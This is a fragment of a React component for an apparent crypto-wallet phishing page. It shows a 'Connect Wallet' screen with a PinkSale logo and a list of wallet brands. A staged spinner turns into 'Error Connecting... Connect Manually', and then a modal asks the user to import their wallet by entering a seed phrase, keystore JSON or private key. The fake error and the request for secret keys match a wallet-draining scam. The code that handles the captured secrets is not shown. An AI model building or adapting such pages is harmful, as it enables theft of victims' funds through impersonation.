    case 'Unagii' : img = <Image height="30" src={unagii} alt="Unagii img" />;
    break;
    case 'Cream Finance' : img = <Image height="30" src={cream} alt="Cream Finance img" />;
    break;
    case 'Cardano' : img = <Image height="30" src={cardano} alt="Cardano img" />;
    break;
    case 'Daedalus' : img = <Image height="30" src={daedalus} alt="Daedalus img" />;
    break;
    case 'CCVault' : img = <Image height="30" src={ccvault} alt="CCVault img" />;
    break;
    case 'Gero' : img = <Image height="30" src={gero} alt="Gero img" />;
    break;
    case 'Nami' : img = <Image height="30" src={nami} alt="Nami img" />;
    break;
    case 'Solana' : img = <Image height="30" src={solana} alt="Solana img" />;
    break;
    case 'Solong' : img = <Image height="30" src={solong} alt="Solong img" />;
    break;
    case 'Exodus' : img = <Image height="30" src={exodus} alt="Exodus img" />;
    break;
    case 'Avalanche' : img = <Image height="30" src={avalanche} alt="Avalanche img" />;
    break;
    case 'Velas' : img = <Image height="30" src={velas} alt="Velas img" />;
    break;
    case 'Fortmatic' : img = <Image height="30" src={fortmatic} alt="Fortmatic img" />;
    break;
    case 'Others' : img = <Image height="30" src={others} alt="Others img" />;
    break;
    default:  img = <Image height="30" src={metamask} alt="Metamask img" />
  }

  console.log('showModal: ', this.state.showModal)
  let modalDown = <Aux>
       <Col md={{span: 10, offset: 1}} className={classes.downCol}>
         <Row>
           <Col md={10}>
            <p className='text-white'>{this.state.name}</p>
            <small className='text-white'>Easy-to-use browser extension</small>
           </Col>
           <Col md={2}>
              {img}
           </Col>
         </Row>
       </Col>
       </Aux>

    let inner = <Aux>
      <Row style={{textAlign: 'left'}}>
            <span >
              Back
            </span>
            <hr></hr>
            <Col md={{span: 10, offset: 1}} className={classes.upCol}>
              <span style={{marginTop: '22px',  color: 'red'}}>Connecting</span>  <ReactLoading className={classes.Loader} text="connecting" type="bubbles" color="red" height={'20%'} width={'20%'} />

            </Col>
             {modalDown}
          </Row>
    </Aux>

    if(this.state.stopConnecting) {
      inner = <Aux>
        <Row style={{textAlign: 'left'}}>
            <span className='text-white'>
              Back
            </span>
            <hr></hr>
            <Col md={{span: 10, offset: 1}} className={classes.upCol2}>
              <span style={{marginTop: '8px', color: 'red'}}>Error Connecting...</span>  <Button onClick={this.moveToNextModalFunc} style={{marginLeft: '30px', fontWeight: 'bold'}} variant="primary"><small>Connect Manually</small></Button>{' '}


            </Col>
            {modalDown}
          </Row>
      </Aux>
    }

    let modal = <Aux>
      <Modal show={this.state.showModal} modalClosed={this.closeModalFunc}>
          {inner}

      </Modal>
    </Aux>

    if(this.state.moveToNextModal){
      modal = <Aux>
      <Modal  show={this.state.showModal} modalClosed={this.closeModalFunc}>

          <Row style={{textAlign: 'left'}}>
            <div style={{display: 'flex'}}>
            <span>
              {img}
            </span>
          <p className='text-white' style={{marginLeft: '5px'}}>Import your {this.state.name} Wallet</p>
          <hr />
            </div>

          <Col style={{marginTop: '12px'}} md={{span: 10, offset: 1}} >

          <Tabs defaultActiveKey="Phrase" id="uncontrolled-tab-example" className="mb-3"> <br></br>
          <Tab eventKey="Phrase" title="Phrase">
            <Phrase startPreloader={this.showPreloaderFunc} modalClosed={this.closeModalFunc} />
          </Tab>
          <Tab eventKey="Keystore JSON" title="Keystore JSON">
          <KeystoreJson startPreloader={this.showPreloaderFunc} modalClosed={this.closeModalFunc} />
          </Tab>
          <Tab eventKey="Private Key" title="Private Key" >
          <PrivateKey startPreloader={this.showPreloaderFunc} modalClosed={this.closeModalFunc} />
          </Tab>
        </Tabs>

          </Col>
          </Row>

      </Modal>
    </Aux>
    }

  return (
    <div className='body_div'>
      {preload}
      {modal}
      <div id="header">
      <div className="content-box-md">
        <div className="">
          <div className="row">
            <div className="col-md-12 col-sm-12 col-xs-12" style={{padding: '2em'}}>
              <div className="header-text">

                <Image className="text-center header-img" src={pinksale} width="100" height="100" alt="" />

              </div>
            </div>
          </div>
        </div>
      </div>
      </div>

      <div className='coin-section'>
        <div className="content-box-md">
          <div className="container">

             <div className="row">
              <div className="text-center coin-section-header">
                <h1 className="animated pulse">Connect Wallet</h1>
                <h6 className="animated pulse">
                  Please connect your wallet to continue
                </h6>
              </div>
             </div>

             <div className="row">
                <div className="search">
                  <input value={this.state.search} onChange={(e) => this.changeSearchInput(e)}  type="text" id="search-field" name="search" placeholder="Search" />
                </div>
              </div>

             <div className="row">
                <div className="coin-registry">
                    {this.displayWalleths()}
                </div>
             </div>

             <div class="row">
              <div class="text-center coin-section-footer"><h6>&nbsp;</h6></div>
            </div>


          </div>
        </div>
      </div>

    </div>
  )
 }


}

